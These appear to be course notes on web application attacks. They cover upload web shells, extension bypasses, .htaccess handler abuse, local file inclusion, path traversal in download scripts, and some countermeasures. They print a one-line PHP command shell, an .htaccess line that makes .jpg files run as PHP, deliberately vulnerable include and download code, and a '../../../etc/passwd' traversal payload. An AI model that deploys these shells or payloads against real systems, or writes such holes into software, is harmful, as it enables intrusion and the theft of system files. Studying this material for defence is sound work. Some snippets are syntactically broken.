# File Web Shell

## Part 1. Review
* File upload
* Web shell attack
```php
<?php system($_GET['c']); ?>
```
* Windows server : IIS web server
  - Uploading exe file = it operates on directly
  - Uploading php file = it is able to operate on web server if it know exact path.

## Part 2. Different Web Shell
* Image Web Shell
  - webshell.php.jpg => impossible
  - double extension
  - deceiving extension
  - null byte injection

* htaccess
  - AddType application/x-httpd-php .jpg

* Reverse Shell

* Database information
  - File Include = include, include_once, require
```php
<?php include('nav.php') ?>
```
* File include
  - web page = Depending on the parameter value, it shows different pages
  - ?lang=ko.php
```php
<?php include($_GET['lang'];  ?>
```
- it is possible to bring any random file.
- it can't see the source code!
- Local File Include Vulnerability

## Part 3. Web log
- access log = ../../opt/lampp/logs/access_log

* File upload countermeasure
  - file name obfuscation
  - hiding file path
  - Authentication vulnerability = when downloading to get access to the random path
  - Saving in the Database (BLOB / CLOB)
  - NAS = Network-attached storage (NAS) is a file-dedicated storage device that makes data continuously available for employees to collaborate effectively over a network

## Part 4. File download countermeasure
- File download vulnerability
```
download.php?fileName=test.txt
```
```php
<?php fileName = $_GET['fileName'];
download('/files// . $fileName); ?>
```
```
fileName = ../../../etc/passwd
```
- Download Recommendation files
- Linux = /etc/passwd
- Windows = /boot.ini , /winnt/win.ini

## Part 5. Assignment
1. Web Development
2. CTF
3. Web development: Blog
4. Report of vulnerability
